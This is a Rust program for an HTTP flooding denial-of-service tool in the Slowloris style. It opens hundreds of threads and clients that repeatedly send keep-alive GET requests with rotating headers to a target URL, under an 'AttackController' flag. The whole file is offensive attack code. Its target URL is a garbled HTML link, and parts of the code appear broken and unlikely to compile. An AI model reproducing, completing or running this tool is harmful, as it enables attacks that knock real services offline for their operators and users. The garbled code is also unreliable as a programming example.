use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use rand::Rng;
use reqwest::blocking::{Client, Response};
use tokio::runtime::Runtime;

fn main() {
let url = "<a href="https://www..com">https://www..com</a>";
let input = 200; // Number of sockets

println!("{}", url);
println!("{}", input);
println!("check them");

let attack_controller = Arc::new(Mutex::new(AttackController::new()));

let mut handles = Vec::new();

for _ in 0..input {
let attack_controller_clone = Arc::clone(&attack_controller);

let handle = thread::spawn(move || {
let mut all_the_sockets = Vec::new();

println!("Creating sockets...");

for _ in 0..input {
if !attack_controller_clone.lock().unwrap().is_attacking {
println!("Attack is stopped.");
break;
}

match IOClient::new() {
Ok(client) => {
all_the_sockets.push(client);
println!("try?");
let mut headers = reqwest::header::HeaderMap::new();
headers.insert(reqwest::header::ACCEPT_LANGUAGE, "en-US,en,q=0.5".parse().unwrap());
headers.insert(reqwest::header::CONNECTION, "Keep-Alive".parse().unwrap());

let mut rng = rand::thread_rng();
let user_agent = get_random_user_agent();
headers.insert(reqwest::header::USER_AGENT, user_agent.parse().unwrap());

match send_request(&all_the_sockets, url, &headers) {
Ok(_) => {
println!("Successfully sent [+] GET /? HTTP /1.1 ...");
println!("Successfully sent [+] Headers ...");
}
Err(err) => {
println!("Request error: {}", err);
}
}

let cloned_attack_controller = Arc::clone(&attack_controller_clone);

// Use stream and for_each instead of interval and for
let timer = tokio::time::interval(Duration::from_secs(1)).stream();
let handle = thread::spawn(move || {
let mut rt = Runtime::new().unwrap();
rt.block_on(async {
timer.for_each(|_| async {
if !cloned_attack_controller.lock().unwrap().is_attacking {
println!("Attack is stopped.");
return;
}

match send_request(&all_the_sockets, url, &headers) {
Ok(_) => {
println!("[-][-][*] Waiter sent.");
}
Err(err) => {
println!("Request error: {}", err);
}
}
}).await;
});
});

handles.push(handle);
}
Err(err) => {
println!("Socket creation error: {}", err);
}
}
}
});

handles.push(handle);
}

for handle in handles {
handle.join().unwrap();
}

println!("Attack stopped.");
}

fn send_request(clients: &[IOClient], url: &str, headers: &reqwest::header::HeaderMap) -> Result<(), reqwest::Error> {
let mut rng = rand::thread_rng();
let mut headers = headers.clone();
headers.insert(reqwest::header::USER_AGENT, get_random_user_agent().parse().unwrap());
headers.insert("X-a", rng.gen_range(0..5000).to_string().parse().unwrap());

for client in clients {
if !client.attack_controller.lock().unwrap().is_attacking {
return Ok(());
}

match client.client.get(url).headers(headers.clone()).send() {
Ok(response) => {
if response.status().is_success() {
println!("Request successful");
} else {
println!("Request failed with status: {}", response.status());
}
}
Err(err) => {
println!("Request error: {}", err);
}
}
}

Ok(())
}

struct AttackController {
is_attacking: bool,
}

impl AttackController {
fn new() -> Self {
AttackController { is_attacking: true }
}
}

struct IOClient {
client: Client,
attack_controller: Arc<Mutex<AttackController>>,
}

impl IOClient {
fn new() -> Result<Self, reqwest::Error> {
Ok(IOClient {
client: Client::new(),
attack_controller: Arc::new(Mutex::new(AttackController::new())),
})
}
}

fn get_random_user_agent() -> String {
// Return a random user agent string
// Implement your logic to generate user agent here
// For now, returning a placeholder
"Placeholder User Agent".to_string()
}